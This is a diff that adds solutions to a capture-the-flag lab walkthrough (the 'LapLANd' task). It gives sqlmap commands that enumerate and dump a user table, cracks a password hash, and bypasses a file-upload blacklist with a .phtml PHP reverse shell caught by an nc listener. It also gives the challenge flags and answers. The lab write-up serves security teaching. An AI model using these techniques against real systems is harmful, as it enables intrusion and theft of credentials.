@@ -1401,27 +1401,125 @@ Supporting material available [here](https://docs.google.com/document/d/15XH_T1o
 Q1: Which field is SQL injectable? Use the input name used in the HTML code.
 **Hint: SQLMap will highlight which field is vulnerable, if you decide to use it.**
 
-A:
+A: log_email
+
+**Solution**
+
+```shell
+$ sqlmap -u 'http://10.10.139.141/register.php' --dbms="MySQL" --forms --dbs --batch
+```
+
+Use the Above `sqlmap` command to enumerate target databases there 
+- `-u` is use to specify Target URL
+- `--dbs` is use for enumerate databases in DBMS
+- `--dbms="MySQL"` is use to specify the target system is using MySQL database
+- `--forms` is use to specify we are targeting the form in the target URL
+-   `--batch` is use to specify Never ask for user input, use the default behavior
+
+When this command run they search every method to do `SQLi` and they take a while and when they found the `SQLi` vulnerability they search all available Databases in DBMS and after that show you all the databases like the following
+
+![Task28_SQLi_Databases](https://user-images.githubusercontent.com/85181215/136405222-b7b0b2df-b057-4ea1-b1c9-a0d4e09e9a09.png)
+
+
+There we see the payload `sqlmap` use to check is it vulnerable or not and when they found out that then they search all the databases in DBMS and then show us all the result 
 
 Q2: What is Santa Claus' email address? 
 **Hint: If your injection is going very slowly, consider enumerating only the information you need instead of trying to dump the whole database.**
 
-A:
+A: `bigman@shefesh.com`
+
+**Solution**
+
+Now we got the Databases in DBMS so we have to see which database is use in `LapLand` and we see there is a `social` database so we target that to database.
+so now we have to know how many tables in that database so we use the following command to get total number of tables in social database
+
+```shell
+$ sqlmap -u 'http://10.10.139.141/register.php' --dbms="MySQL" --forms -D "social" --tables --batch
+```
+
+There 
+
+- `-u` is use to specify Target URL
+- `--dbms="MySQL"` is use to specify the target system is using MySQL database
+- `--forms` is use to specify we are targeting the form in the target URL
+- `-D` is use to specify Database name we want to target here it is `social`
+- `--tables` is use to specify enumerate all the tables in mentioned database
+-   `--batch` is use to specify Never ask for user input, use the default behavior
+
+So when this command run they do `SQLi` again by finding injection vector first and then enumerate mentioned database tables and show us all the result like following
+
+![Task28_SQLi_Tables](https://user-images.githubusercontent.com/85181215/136405299-de5072cc-2311-4e7c-93d8-03eec60e39b2.png)
+
+
+There we see all the tables in social database and we see there is a `users` table so now we target that table and enumerate total number of columns in that tables with the following command
+```
+$ sqlmap -u 'http://10.10.139.141/register.php' --dbms="MySQL" -D "social" -T "users" --columns  --batch --forms
+```
+There
+- `-u` is use to specify Target URL
+- `--dbms="MySQL"` is use to specify the target system is using MySQL database
+- `--forms` is use to specify we are targeting the form in the target URL
+- `-D` is use to specify Database name we want to target here it is `social`
+- `-T` is use to specify Table name in mentioned database
+-  `--columns` is use to specify enumerate total columns in mentioned table
+-   `--batch` is use to specify Never ask for user input, use the default behavior
+
+When this command run they show us all the columns in mentioned tables and database like following
+
+![Task28_SQLi_Columns](https://user-images.githubusercontent.com/85181215/136405361-cbd4dc26-0458-4d13-b95c-51b9fab3c455.png)
+
+
+There we see all the columns in the table so now we can dump all the data in that columns using the following command 
+
+```
+$ sqlmap -u 'http://10.10.139.141/register.php' --dbms="MySQL" -D "social" -T "users" --dump --batch --forms
+```
+There 
+- `--dump` is use to specify dump all the data in the mentioned table
+When this command run they show us every data in the table like the following
+
+![Task28_SQLi_Columns_Data](https://user-images.githubusercontent.com/85181215/136405411-70dc9ed9-2abe-40ce-8ec6-7f363d2035fd.png)
+
+
+There we all the columns that we enumerate previously but now we also got its content and there we see all users email,Name,usernames and password hash etc   
 
 Q3: What is Santa Claus' plaintext password?
 **Hint: It's in rockyou.txt - also try online sites such as HashKiller or Crackstation**
 
-A:
+A: saltnpepper
+
+**Solution**
+
+Copy Santa Claus password hash and use any password cracking tool like `hashcat` or `john` etc to crack it or you can also use online site `crackstation`
+to crack that hash 
 
 Q4: Santa has a secret! Which station is he meeting Mrs Mistletoe in?
 **Hint: Look at the private messages between users, either through the database or logging in as Santa!**
 
-A:
+A: Waterloo
+
+**Solution**
+
+Now you got Santa Claus email and password from previous task so now you can use that to login to Santa account in `Lapland`.After login go to message section to see Santa private messages to get the answer
 
 Q5: Once you're logged in to LapLANd, there's a way you can gain a shell on the machine! Find a way to do so and read the file in /home/user/
 **Hint: If you're getting an error about a file format being blacklisted, try looking up alternative file extensions that will still execute.**
 
-A:
+A: THM{SHELLS_IN_MY_EGGNOG}
+
+**Solution**
+
+Now you have Santa account so you can upload a PHP reverse shell in Post section first download the PHP reverse shell from the  [  pentestmonkey/php-reverse-shell - GitHub](https://github.com/pentestmonkey/php-reverse-shell) and edit your system IP Address and Port number you want to get reverse shell back and save it and try to upload that as a Santa Post.They are not uploaded because they use some blacklist to block `php` extension so you can rename that `php` reverse shell and change its extension with `phtml` and try to upload it and they work so now start a listener on your system with the port you set in reverse shell with the following command
+```sh
+$ nc -lvnp 4444
+```
+After that reload that the page or right click to your `php reverse shell` post and click on reload image and  after you will get the reverse shell back to your listener if not use different extension like `phps,php7` etc
+
+Now you got the reverse shell so now use the following command to see the flag
+```shell
+$ cat /home/user/flag.txt
+```
+
 
 
 
